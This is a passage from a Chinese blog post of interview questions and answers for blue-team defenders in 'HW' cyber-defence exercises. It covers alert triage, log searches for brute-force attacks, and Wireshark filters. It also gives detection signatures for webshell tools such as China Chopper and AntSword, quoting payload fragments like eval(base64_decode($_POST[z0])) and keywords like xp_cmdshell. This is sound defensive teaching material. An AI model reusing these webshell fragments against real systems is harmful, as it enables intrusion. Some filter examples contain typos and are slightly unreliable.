<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
    <meta name="baidu-site-verification" content="093lY4ziMu" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="description" content="blog-wxx">
    <meta name="keyword"  content="wxx">
    <link rel="shortcut icon" href="/img/ironman-draw.png">
    <!-- Place this tag in your head or just before your close body tag. -->
    <script async defer src="https://buttons.github.io/buttons.js"></script>
    <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
    <title>
        
          HW面经100问（含答案） - wxx&#39;s_Blog
        
    </title>

    <link rel="canonical" href="https://github.com/wxx0105/wxx0105.github.io/2022/07/07/HW面经100问（含答案）/">

    <!-- Bootstrap Core CSS -->
    
<link rel="stylesheet" href="/css/bootstrap.min.css">


    <!-- Custom CSS --> 
    
        
<link rel="stylesheet" href="/css/dusign-dark.css">

        
<link rel="stylesheet" href="/css/dusign-common-dark.css">

        
<link rel="stylesheet" href="/css/font-awesome.css">

        
<link rel="stylesheet" href="/css/toc.css">

    
    
    <!-- Pygments Highlight CSS -->
    
<link rel="stylesheet" href="/css/highlight.css">


    
<link rel="stylesheet" href="/css/widget.css">


    
<link rel="stylesheet" href="/css/rocket.css">


    
<link rel="stylesheet" href="/css/signature.css">


    
<link rel="stylesheet" href="/css/fonts.googleapis.css">


    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">

    <!-- photography -->
    
<link rel="stylesheet" href="/css/photography.css">


    <!-- ga & ba script hoook -->
    <script></script>
<meta name="generator" content="Hexo 4.2.1"></head>


<!-- hack iOS CSS :active style -->
<body ontouchstart="">

    <!-- background effects start -->
    
    <!-- background effects end -->

	<!-- Modified by Yu-Hsuan Yen -->
<!-- Post Header -->
<style type="text/css">
    header.intro-header{
        
            
                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.5)), url('')
                /*post*/
            
        
    }
    
</style>

<header class="intro-header" >
    <!-- Signature -->
    <div id="signature">
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                
                    <div class="post-heading">
                        <div class="tags">
                            
                        </div>
                        <h1>HW面经100问（含答案）</h1>
                        <h2 class="subheading"></h2>
                        <span class="meta">
                            Posted by wx_x on
                            2022-07-07
                        </span>

                        
                            <div class="blank_box"></div>
                            <span class="meta">
                                Words <span class="post-count">28.7k</span> and
                                Reading Time <span class="post-count">107</span> Minutes
                            </span>
                            <div class="blank_box"></div>
                            <!-- 不蒜子统计 start -->
                            <span class="meta">
                                Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
                            </span>
                            <!-- 不蒜子统计 end -->
                        

                    </div>
                

                </div>
            </div>
        </div>      
    </div>

    
    <div class="waveWrapper">
        <div class="wave wave_before" style="background-image: url('/img/wave-dark.png')"></div>
        <div class="wave wave_after" style="background-image: url('/img/wave-dark.png')"></div>
    </div>
    
</header>

	
    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">wxx</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <!-- Known Issue, found by Hux:
            <nav>'s height woule be hold on by its content.
            so, when navbar scale out, the <nav> will cover tags.
            also mask any touch event of tags, unfortunately.
        -->
        <div id="huxblog_navbar">
            <div class="navbar-collapse">
                <ul class="nav navbar-nav navbar-right">
                    <li>
                        <a href="/">Home</a>
                    </li>

                    

                        
                    

                        
                        <li>
                            <a href="/PhoT_o/">Photography</a>
                        </li>
                        
                    

                        
                        <li>
                            <a href="/archive/">Archives</a>
                        </li>
                        
                    

                        
                        <li>
                            <a href="/tags/">Tags</a>
                        </li>
                        
                    

                        
                        <li>
                            <a href="/about/">About</a>
                        </li>
                        
                    
                    
                    
                </ul>
            </div>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>
<script>
    // Drop Bootstarp low-performance Navbar
    // Use customize navbar with high-quality material design animation
    // in high-perf jank-free CSS3 implementation
    var $body   = document.body;
    var $toggle = document.querySelector('.navbar-toggle');
    var $navbar = document.querySelector('#huxblog_navbar');
    var $collapse = document.querySelector('.navbar-collapse');

    $toggle.addEventListener('click', handleMagic)
    function handleMagic(e){
        if ($navbar.className.indexOf('in') > 0) {
        // CLOSE
            $navbar.className = " ";
            // wait until animation end.
            setTimeout(function(){
                // prevent frequently toggle
                if($navbar.className.indexOf('in') < 0) {
                    $collapse.style.height = "0px"
                }
            },400)
        }else{
        // OPEN
            $collapse.style.height = "auto"
            $navbar.className += " in";
        }
    }
</script>


    <!-- Main Content -->
    <!-- Post Content -->
<article>
    <div class="container">
        <div class="row">

            <!-- Post Container -->
            <div class="
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                post-container">

                <p>HW面试八十六问（含答案）</p>
<h2 id="一、常问问题"><a href="#一、常问问题" class="headerlink" title="一、常问问题"></a>一、常问问题</h2><h3 id="问一：用过哪些监控设备？（主要是天眼的操作）"><a href="#问一：用过哪些监控设备？（主要是天眼的操作）" class="headerlink" title="问一：用过哪些监控设备？（主要是天眼的操作）"></a>问一：用过哪些监控设备？（主要是天眼的操作）</h3><p>奇安信的天眼、WAF 、蜜罐、绿盟态势感知、防火墙、IDS（入侵检测系统）、IPS（入侵防御系统），中睿的睿眼，他会自动匹配可能是攻击的数据包，然后通过数据包判断是否是攻击。</p>
<p>天眼的全称是奇安信新一代安全感知系统，它以攻防渗透和数据分析为核心竞争力，聚焦威胁检测和响应，为安全服务和分析人员提供一套在监测预警、威胁检测、溯源分析和响应处置上得心应手的威胁检测平台。</p>
<p><img src="HW%E9%9D%A2%E7%BB%8F100%E9%97%AE%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89.assets/4ccb9592325494ecdbf78793243f77b0.png" alt="img"> </p>
<ul>
<li><p>天眼三大功能：</p>
<p>传感器（对流量解析还原，发现网络攻击和 web 攻击能力） </p>
<p>沙箱（发现恶意样本投递能力）</p>
<p>分析平台（存储历史流量，分析威胁和溯源能力）  </p>
</li>
<li><p>天眼使用：</p>
<p>天眼威胁感知： 警告类型：APT 攻击   威胁级别：高危   攻击结果：失陷    攻击次数：3 </p>
<p>天眼搜索：源 IP sip   目的 IP dip  地理信息：境内还是境外   </p>
<p>搜索示例:（sip:”192.168.1.1”）OR（dip:”192.168.1.1”）  </p>
<p>天眼类别：威胁感知调查分析 场景化分析</p>
<p>日志检索：例子：search sip:”10.1.1.1/8” |tcp 100 dip 资产 报表 安全服务  系统管理</p>
</li>
<li><p>天眼分析：</p>
<p>爆破和踩点行为分析：</p>
<p>登录爆破类：单个IP，使用多个用户名和密码组合进行登录尝试，导致短时间内大量登录失败<br>目录和资源爆破：短时间内访问大量url，触发大量404<br>手段：</p>
<p>1.找到爆破行为IP，阻断爆破行为    </p>
<p>2.找到攻击成功的IP   </p>
<p>3.分析攻击IP的操作，编写事件报告</p>
<p>ftp 爆破：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">日志检索使用天眼语法搜索爆破IP：normal_ret:failed AND proto:ftp</span><br><span class="line">判断爆破成功行为：normal_ret:success  AND proto:ftp AND sip:(攻击ip1 OR 攻击ip2)</span><br></pre></td></tr></table></figure>
<p>ssh 爆破：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">日志检索使用天眼语法搜索爆破IP：normal_ret:failed AND proto:ssh</span><br><span class="line">判断爆破成功行为：normal_ret:success AND proto:ssh AND sip(攻击ip1 OR 攻击ip2)</span><br></pre></td></tr></table></figure>
<p>数据库爆破：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">normal_ret:failed AND proto:(oracle OR mysql OR mssql OR postgresql)</span><br><span class="line">normal_ret:success AND proto:(oracle OR mysql OR mssql OR postgresql) AND sip:(攻击IP1 OR 攻击IP2)</span><br></pre></td></tr></table></figure>
<p>远程桌面爆破：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">normal_ret:failed AND proto:rdp</span><br><span class="line">normal_ret:success AND proto:rdp AND sip:(攻击IP1 OR 攻击IP2)</span><br></pre></td></tr></table></figure>
<p>web 登录入口爆破：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对弱口令就行分析：uri:爆破路径 AND sip:攻击ip，查找爆破的流量日志</span><br></pre></td></tr></table></figure>
<p>目录和资源猜解：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据域名和攻击ip进行分析：host:域名 AND sip:攻击IP，查询攻击IP的访问记录是否触发大量404响应</span><br></pre></td></tr></table></figure>
</li>
<li><p>天眼失陷事件处理：</p>
<p>1、web攻击分析思路：<br>web攻击：查看请求包 与 响应包（有没有报红，有没有攻击成功）<br>查看告警详情（查看请求头、请求体内容，定位到告警攻击动作的payload）<br>分析攻击动作是什么（读取文件、打印输出内容、写入文件和尝试下载文件，执行函数或命令 XSS  XXE webshell等）<br>分析响应（分析告警响应头，响应体，网络行为是否有动作预期的结果）  </p>
<p> 发现 webshell 和主机木马： 确认创建时间、功能分析等，查看访问日志，攻击行为记录等，通知主机所属人 对发现的 webshell 文件或木马进行排查处置</p>
</li>
</ul>
<h3 id="问二：以往的HW工作都干些什么？"><a href="#问二：以往的HW工作都干些什么？" class="headerlink" title="问二：以往的HW工作都干些什么？"></a>问二：以往的HW工作都干些什么？</h3><p>我所在的现场，根据甲方需求，分为 4 组：监控组、应急组、处置组、溯源反制组</p>
<p>1、监测组监测设备，整理报警信息，提交交处置单给防守应急组 ；</p>
<p>2、防守应急拿到处置单，进行排查，该组没有看机器的权限，只能和处置组建群沟通，根据处置单（期间要不停的去检测组设备上看详细信息），提出处置建议，让处置组来操作；</p>
<p>3、处置组，主要是甲方的业务人员，因为很多对应急的操作不是很熟悉，而且有些系统他们还需要找系统服务商进行操作，这就增加了沟通的成本；</p>
<p>4、溯源反制组，根据确定的攻击进行溯源和反制，前两天真实攻击较少所以一个处置单 ，基本消耗在不停的找人的路上，一个处置单最初只有建群的时候只有 3 个人，中间遇到不停的问题不停的加人入群，有负责 VPN  的、系统业务开发公司的、甲方维护的、系统管理的….就这样不停的加，直接一个处置单群，加了 20  多个人。</p>
<p>每天的服务器流量告警，只有一些寻常的弱口令异常流量和一些简单的 sql 注入，端口扫描事件，我们只需整改弱口令，封禁发起 sql 注入和端口扫描的 ip 即可</p>
<p>防守日常就是看流量、分析流量，其中大部分都为扫描器流量，由于一般扫描器都会部署在 VPS 上，因此我们可以结合流量监测平台反向扫描。</p>
<ul>
<li><p>第一步，安全感知平台查看事件预警，分析预警是否误报，</p>
<p>误报，忽略；非误报，进行分析</p>
</li>
<li><p>第二步，从安全按感知平台，安全设备，对攻击事件进行分析，</p>
<p>不成功，封禁 IP；成功，开启应急响应排查流程</p>
</li>
<li><p>第三步，应急响应，Webshell（网站失陷），</p>
<p>排查 webshell，并且通过安全平台日志分析漏洞，进行下线或修补漏洞，服务器失陷，应急</p>
</li>
</ul>
<h3 id="问三：攻击类别识别方法有哪些？"><a href="#问三：攻击类别识别方法有哪些？" class="headerlink" title="问三：攻击类别识别方法有哪些？"></a>问三：攻击类别识别方法有哪些？</h3><p><strong>1、识别攻击源 IP**</strong></p>
<p>在护网期间，很多局点扫描探测类日志占所有攻击日志（IPS）的 90% 以上，此类日志主要来源于自研 / 开源全网扫描器、僵尸网络发起的自动化感染传播。</p>
<p>而在攻防演练实战中，攻击者通常采用搜索引擎对目标进行资产收集。在找到资产的网络区间后，细心的攻击方会对 C 段进行全端口扫描，通过连续的端口扫描日志或者 NMAP 指纹信息日志，通常能判定出攻击者针对性的网络探测行为，很可能是演练攻击方。</p>
<p>有的攻击方在探测目标时，会使用自研的扫描器进行主动扫描，或者通过代理转发至 XRay、W13SCA 扫描器进行被动扫描。这种扫描会在短时间内出现一个源 IP 对一个目标服务器大量的 SQL 注入、XSS 等常规的  WEB 漏洞等攻击日志，这种情况基本也能判定为攻击方行为。</p>
<p>这类扫描类日志，特点是日志量特别大，攻击源 IP 相对固定，攻击持续时间短或长或短，扫描产生的日志类型较多。值得注意的是，很多客户网络是部署有负载均衡和反向代理设备的，需要获取到日志的真实源 IP 才能进行针对性的防护，切忌直接封堵，以免影响业务。</p>
<p><strong>2、手工试探类</strong></p>
<p>在高水准的对抗和演练中，攻击方通常不会进行盲目的扫描。在找到目标资产后，他们会进行谨慎的手工尝试，这类尝试性的日志，很容易被大量的扫描日志所淹没。因此，对于某些提示攻击方意图的告警日志，也需要进行重点处理。</p>
<p>比如攻击方找到上传点，会进行手工上传测试，找到疑似 Struts2，ThinkPHP 框架的系统，会用开源工具或者带编码绕过的自研工具进行尝试，在登录框进行 SQL 手工尝试，或者用 Shiro  反序列化工具尝试等。这些攻击流量产生的日志数量极少，却不能被防守方轻易忽略，可以针对最近一年或近年爆出的漏洞、以及客户资产情况，进行有针对性的日志搜索，一旦发现，可以进行封堵或加固，同时顺藤摸瓜，或去态势感知等平台上进行上下文关联，进一步判断攻击是否成功、摸出攻击者意图。</p>
<h3 id="问四、关注那些重点事件日志？"><a href="#问四、关注那些重点事件日志？" class="headerlink" title="问四、关注那些重点事件日志？"></a>问四、关注那些重点事件日志？</h3><p>高级别的演练持续时间为两到三周，进入中后期，人倦马乏，很容易进入懈怠疏漏。其实，攻击方的比拼在演练中段已经进入焦灼状态，大比分在此时拉开。防守方也需要加强投入，在中后期更需要关注一些重点事件，及时发现包括 0day、新增外联、内网异常行为之类的风险。攻击方此时会亮出各家压箱底的武器，0day  的使用和针对防护设备的变形绕过都是常态，不排除现有的防护设备和系统暂时  “失明”，难以全面覆盖到攻击链的每一个点，这时，在日志中发现蛛丝马迹，找到关键重点事件就极有意义。这些重点事件类型包括：</p>
<p><strong>1、异常属性类</strong></p>
<p>考虑到攻方可能将扫描器和 C2 服务器部署在个人 VPS 上，而这些 VPS 极有可能是个人购买的云服务。在攻击日志分析时，对于 IP  归属地是国内外的云服务商的情况都需要加以关注。有的攻击方会在深夜乘防守方警惕性降低时进行攻击尝试，因此半夜出现的新增攻击日志源，也值得警惕。</p>
<p>攻击源 IP 的时间属性也有一定价值，如果某个源 IP 只在攻防演练开始之才出现日志，而之前并未出现过攻击行为，很可能来自于演练攻击方。单纯从攻击日志的各类属性特点来分析日志，也能起到一定作用，当然以上方法结合分析，效果更好。</p>
<p>NOD（Newly Observed Domain），域名也是可疑的观察对象之一。在演练前突然新增的域名，极有可能是攻击方为活动前做的准备。对于这类 NOD  域名可以提前分析获取，加入关注名单。一旦产生类似的外联日志，哪怕原有的情报和态势系统没有告警，也建议马上行动，展开失陷资产排查，并向前溯源，最大程度的还原攻击路径。</p>
<p><strong>2、木马连接类</strong></p>
<p>Webshell  连接工具，包括老式的大马，小马，菜刀，及各类新式的冰蝎，哥斯拉，天蝎，内存马等，特点是倾向于加密的通信，让传统检测设备无法发现行踪。在防守方的日常检测中，一旦发现木马远控连接工具，包括 Cobalt Strike 的命令下发流量（HTTP 协议）和证书指纹规则（HTTPS 协议），MSF 自带木马 Meterpreter  及各类开源远控等的痕迹，以及这些工具通信流量产生的日志都需要警醒，这预示着内网已有机器失陷。部分工具的加密流量通信单纯靠某条规则无法检测，可能需要多模块综合研判以及 AI 分析模块协助处理。所以除了攻击日志，还需要将 AV、情报、AI 研判模块产生的日志一并纳入检测分析范围。</p>
<p><strong>3、代理隧道类</strong></p>
<p>在获取权限后，攻击方通常会使用代理工具搭建隧道进入内网，以获得稳定的控制权限。一旦出现代理隧道的日志，也说明形势较为危急，预示着攻击方可能已经打入内网。这些代理类日志包括 SOCKS 的反向代理（Earthworm、FRP、dtunnel_lite 等）、Reduh、Regeorg 等各类 web  代理隧道。传统设备如 IPS  的先验规则只能检测到明文代理流量，新华三安全设备特意基于代理隧道进行了专项覆盖，对于以上代理可以最大程度的识别，加密的隧道，可以在协商阶段尽早识别。</p>
<p><strong>4、横向扫描类</strong></p>
<p>利用代理隧道进入内网的攻击方，可能通过 Ladon 等工具进行网段、端口、服务的探测，以及使用爆破，撞库的方式进行内网密码破解。因此由内网 IP 发起的扫描探测日志如果被部署在内网的安全设备检测上报，那么这些日志也是非常值得关注的。</p>
<p>这几类重点事件的日志，一般表明有系统被攻陷，因此这些规则需要在演练之前保持开启状态，且演练期间关注级别很高，即使出现的日志条数只有一条，也要优先介入分析。这也对防守方攻防基础提出了一定的要求，初级防守方人员可以联动后台攻防实验室进行有效协同，中高级守方人员可以在实战中进行攻击负载和技战法的总结，形成经验智库。</p>
<p><strong>5、补充</strong></p>
<p>现场分析人员若对某条攻击日志的具体含义持疑，无法判定攻击源 IP 是否恶意时，可以结合该源 IP 和该事件的其他相关日志进行辅助分析，通过绘制力导向图，来判断该 IP 的攻击意图。</p>
<ul>
<li>OA:（重点）泛微，致远，金蝶，蓝凌，万户，金和或者自研发系统 OA，财务系统</li>
<li>ERP:（重点）Microsoft Dynamics GP，Oracle JD Edwards EnterpriseOne，金蝶 - U9，用友 - K/3, 神舟数码 - 易助，SAP ERP，Infor M3</li>
<li>重要信息节点：email，exchange，office 365，DC2012R2，DC2008 R2</li>
<li>web 中间件：IIS/apache/tomcat/weblogic/jboss/websphere/Nginx/FastCGI/PHPCGI/haproxy </li>
</ul>
<h3 id="问五：有什么办法判断误报？"><a href="#问五：有什么办法判断误报？" class="headerlink" title="问五：有什么办法判断误报？"></a>问五：有什么办法判断误报？</h3><p>时间线拉长，看看类似的请求或者数据包在之前很长一段时间有无出现。如果不是特别有规律的参数，如 md5 这类，一般是业务误报。如果是一些类似于文件操作或者命令执行的参数，很有可能就是攻击数据包。实在不确定就去问客户。</p>
<p>处置单大致分为 4 类，</p>
<p>1、业务系统之间的调用请求，设备报警，内网渗透向；</p>
<p>2、业务公司人员上生产系统上的 poc 测试（直接执行注入和远程读取命令），被系统误报成渗透攻击（这一条应该不算是误报，毕竟有攻击行为，只不过是自己人干的）；</p>
<p>3、centos 系统自动更新系统文件，设备报警，未经授权的访问外网；</p>
<p>4、业务人员配置中间件，设备报警；</p>
<h3 id="问六：你有那些SQL-查询异常流量分析的思路？"><a href="#问六：你有那些SQL-查询异常流量分析的思路？" class="headerlink" title="问六：你有那些SQL 查询异常流量分析的思路？"></a>问六：你有那些SQL 查询异常流量分析的思路？</h3><p>1、数据库短时间内查询增多有可能遭遇到了【扫描】或者【sql 注入测试】，可以结合流量分析工具进行研判</p>
<p>2、【select】 和【union】为数据库查询语句特征，当这两者数量出现次数较多而且差异较小可能存在 SOL 注入漏洞或正在被扫描器扫描，可监控这两个关键字，但还需 要进一步查看具体请求参数。</p>
<p>如：                        </p>
<p>（1) 使用 wireshark 打开抓取后的流量包                        </p>
<p>（2) 对于抓取到的数据包筛选出 HTTP 协议包，在统计处筛选出短时间内流量较大的 IP </p>
<p>（3）尝试定位一些基本的注入特征（select、union、（）、/*、sleep 等）</p>
<h3 id="问七：讲一下常见工具的流量特征"><a href="#问七：讲一下常见工具的流量特征" class="headerlink" title="问七：讲一下常见工具的流量特征"></a>问七：讲一下常见工具的流量特征</h3><ul>
<li>菜刀流量特征 (最开始是明文传输，后来采用 base64 加密)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PHP类WebShell链接流量</span><br><span class="line">第一：“<span class="built_in">eval</span>”，<span class="built_in">eval</span>函数用于执行传递的攻击payload，这是必不可少的；</span><br><span class="line">第二：(base64_decode(<span class="variable">$_POST</span>[z0]))，(base64_decode(<span class="variable">$_POST</span>[z0]))将攻击payload进行Base64解码，</span><br><span class="line">因为菜刀默认是使用Base64编码，以避免被检测；</span><br><span class="line">第三：&amp;z0=QGluaV9zZXQ...，该部分是传递攻击payload，此参数z0对应<span class="variable">$_POST</span>[z0]接收到的数据，该参数值是</span><br><span class="line">使用Base64编码的，所以可以利用base64解码可以看到攻击明文。</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line">1.有少数时候<span class="built_in">eval</span>方法会被assert方法替代。</span><br><span class="line">2.\<span class="variable">$_POST</span>也会被\<span class="variable">$_GET</span>、<span class="variable">$_REQUEST</span>替代。</span><br><span class="line">3.z0是菜刀默认的参数，这个地方也有可能被修改为其他参数名。</span><br></pre></td></tr></table></figure>
<ul>
<li>蚁剑（PHP 用 base64 加密）</li>
</ul>
<p>PHP 类 WebShell 链接流量</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">将蚁剑的正文内容进行URL解码后，流量最中明显的特征为@ini_set(<span class="string">"display_errors"</span>,<span class="string">"0"</span>);</span><br><span class="line">这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码，但是有的客户端会将这段编码或者加密，</span><br><span class="line">而蚁剑是明文，所以较好发现，同时蚁剑也有<span class="built_in">eval</span>这种明显的特征。</span><br><span class="line">蚁剑绕过特征流量</span><br><span class="line">由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显</span><br><span class="line">的特征，即为参数名大多以“_0x.....=”这种形式（下划线可替换为其他）所以，以_0x开头的参数名，</span><br><span class="line">后面为加密数据的数据包也可识别为蚁剑的流量特征。</span><br></pre></td></tr></table></figure>
<ul>
<li>冰蝎（AES 对称加密）：</li>
</ul>
<p>通过 HTTP 请求特征检测</p>
<p>1、冰蝎数据包总是伴随着大量的 content-type：application 什么什么，无论 GET 还是 POST，请求的 http 中，content-type 为 application/octet-stream；</p>
<p>2、冰蝎 3.0 内置的默认内置 16 个 ua（user-agent）头</p>
<p>3、content-length 请求长度，对于上传文件，命令执行来讲，加密的参数不定长。但是对于密钥交互，获取基本信息来讲，payload 都为定长</p>
<ul>
<li>哥斯拉（base64 加密）：</li>
</ul>
<p>特征检测</p>
<p>1、发送一段固定代码（payload），http 响应为空 </p>
<p>2、发送一段固定代码（test），执行结果为固定内容 </p>
<p>3、发送一段固定代码（getBacisInfo）</p>
<p>相同：都是用来连接 Web shell 的工具 不相同：相比于其他三款，冰蝎有流量动态加密。</p>
<h3 id="问八：你知道那些wireshark-简单的过滤规则？"><a href="#问八：你知道那些wireshark-简单的过滤规则？" class="headerlink" title="问八：你知道那些wireshark 简单的过滤规则？"></a>问八：你知道那些wireshark 简单的过滤规则？</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">【过滤ip】：过滤源ip地址:ip.src1.1.1.1;目的ip地址：ip.dst1.1.1.1;</span><br><span class="line">【过滤端口】：过滤80端口：tcp.port80，源端口：tcp.srcport80，目的端口：tcp.dstport==80</span><br><span class="line">【协议过滤】：直接输入协议名即可，如http协议http</span><br><span class="line">【http模式过滤】：过滤get/post包http.request.mothod==<span class="string">"GET/POST"</span></span><br></pre></td></tr></table></figure>
<h3 id="问九：你有那些流量分析溯源的思路？"><a href="#问九：你有那些流量分析溯源的思路？" class="headerlink" title="问九：你有那些流量分析溯源的思路？"></a>问九：你有那些流量分析溯源的思路？</h3><p>假设发现 web 应用服务器发现文件异常增多，初步怀疑被上传 webshell，描述流量分析溯源的思路</p>
<p>可利用流量工具进行溯源：</p>
<p>1、查看 eval、z0、shell、whoami 等关键字，查看出现次数过多的时候，可能 需要查看是哪个页面发起的请求，有可能是 webshell </p>
<p>2、通过 WireShark 工具快速搜索关键字，定位到异常流量包 </p>
<p>3、找出异常 IP 和所上传的内容，查看是否为 webshell </p>
<h3 id="问十：如何定位到攻击-IP？"><a href="#问十：如何定位到攻击-IP？" class="headerlink" title="问十：如何定位到攻击 IP？"></a>问十：如何定位到攻击 IP？</h3><p>1、 首先通过选择 - 统计 - 对话查看流量的走向情况，定位可疑的 IP 地址 </p>
<p>2、 根据定位到的 IP 地址，尝试对上传的 webshell 进行定位 ip.addr ==ip &amp;&amp;http matches “uploadleval|select|xp_cmdshell”&amp;&amp; http.request.method ==  “POST” </p>
<p>3、 查找到 Webshell 后尝试溯源漏洞位置，http.request.uri contains“webshell.php”，定位到最开始 webshell 执行或上传的时候 </p>
<p>4、 根据最开始的 HTTP 上传包或者其他漏洞特产定位漏洞类型</p>
<h3 id="问十一：常见取证分析工具有哪些？"><a href="#问十一：常见取证分析工具有哪些？" class="headerlink" title="问十一：常见取证分析工具有哪些？"></a>问十一：常见取证分析工具有哪些？</h3><p>wireshark</p>
<p>xplico</p>
<p>volatility</p>
<p>fastlr collector</p>
<p>autopsy</p>
<p>dumolt</p>
<p>ftk lmager</p>
<p>foremost</p>
<p>scalpel</p>
<p>bulik_exetractor</p>
<h3 id="问十一：怎么看日志？"><a href="#问十一：怎么看日志？" class="headerlink" title="问十一：怎么看日志？"></a>问十一：怎么看日志？</h3><p><img src="HW%E9%9D%A2%E7%BB%8F100%E9%97%AE%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89.assets/LccY1P.png" alt="img"></p>
<p>1、 特征字符分析 顾名思义，就是根据攻击者利用的漏洞特征，进行判断攻击者使用的是哪一种攻击。SQL 注入、XSS 跨站脚本攻击、恶意文件上传、一句话木马连接等</p>
<p>2、 访问频率分析 不难理解，就是通过查看攻击者访问的频率来判断攻击者使用的是哪一种攻击，SQL 盲注、敏感目录爆破、账号爆破、Web 扫描。</p>
<h3 id="问十二：日志的关注点有那些？"><a href="#问十二：日志的关注点有那些？" class="headerlink" title="问十二：日志的关注点有那些？"></a>问十二：日志的关注点有那些？</h3><p><strong>1、异常时间段登录</strong></p>
<p>比如半夜一两点三四点，有事件 ID4624 产生，服务器有异常登录，开启下列排查，并修改远程桌面密码，尝试溯源。</p>
<p><strong>2、系统安全日志</strong>，针对服务器。</p>
<p><strong>3、windows 安全日志（</strong>系统安全日志的一种），</p>
<p><strong>4、关于远程桌面登录的记录</strong>，</p>
<p>成功和失败事件类型和 ID</p>
<p>远程登录成功，和管理员确定是非管理员操作，基本判定是失陷</p>
<p>远程登录不成功，需要检查谁在登录，如何去禁止登录</p>
<p>（1）内网，检查谁在登录，并且定位 IP 进行排查（内网已经失陷）</p>
<p>（2）外网，封禁 IP 或关闭远程服务。</p>
<h3 id="问十三：windos有那些敏感关键目录？"><a href="#问十三：windos有那些敏感关键目录？" class="headerlink" title="问十三：windos有那些敏感关键目录？"></a><strong>问十三：windos有那些敏感关键目录？</strong></h3><p>Web 应用根目录、文件上传目录</p>
<p>C:\Users\Administrator\Downloads</p>
<p>/var/tmp    tomcat-users.xml    /var/spool/cron/    /etc/crontab</p>
<p>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</p>
<p>C:\Windows\System32\Tasks\    C:\Windows\SysWOW64\Tasks\    C:\Windows\tasks\</p>
<h3 id="问十四：怎么做攻击研判的？"><a href="#问十四：怎么做攻击研判的？" class="headerlink" title="问十四：怎么做攻击研判的？"></a>问十四：怎么做攻击研判的？</h3><p>网络安全中的攻击研判，可以理解为人工层面对攻击事件进行再分析的行为。</p>
<p>一般来说，对攻击事件的分析研判通常从以下 4 个维度进行：</p>
<ol>
<li>对已发现攻击的来源进行研判；</li>
<li>综合分析攻击技术、工具和路径，判断其威胁性大小；</li>
<li>攻击意图研判；</li>
<li>处置方式判断。</li>
</ol>
<p>攻击研判，可以看作安全防护流程最为关键的一环。它上承安全告警的分析，下接安全处置的实施，是安全防护过程中技术含量最高的一步。</p>
<ul>
<li>攻击研判的 6 个步骤</li>
</ul>
<p>攻击研判属于安全事件响应的一部分，为了更好地了解攻击研判在整个事件响应过程中的作用，我们可以把列出包括攻击研判在内的事件响应全流程，其中蓝色部分属于攻击研判的流程部分。</p>
<p><img src="HW%E9%9D%A2%E7%BB%8F100%E9%97%AE%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89.assets/image-20220628184449127.png" alt="image-20220628184449127"></p>
<p><strong>1. 攻击告警真实性研判</strong></p>
<p>在接到告警研判服务请求后，通过内置的研判溯源模型并结合实际环境，快速分析告警主机的进程和操作审计事件，确认告警的真假以及攻击者还做了其他哪些操作，明确告警主机是不是已被入侵，进行系统性的梳理并给出详细的研判分析报告。</p>
<p>在系统发出警报后好做出响应的处置以前，需要对警报进行确认，是误报，还是真的有告警事件发生？如果告警是真实的，那么攻击者是正在试图入侵的过程中，还是已经成功入侵？只有确认告警事件为攻击者已经成功入侵后，才会启动响应处置。</p>
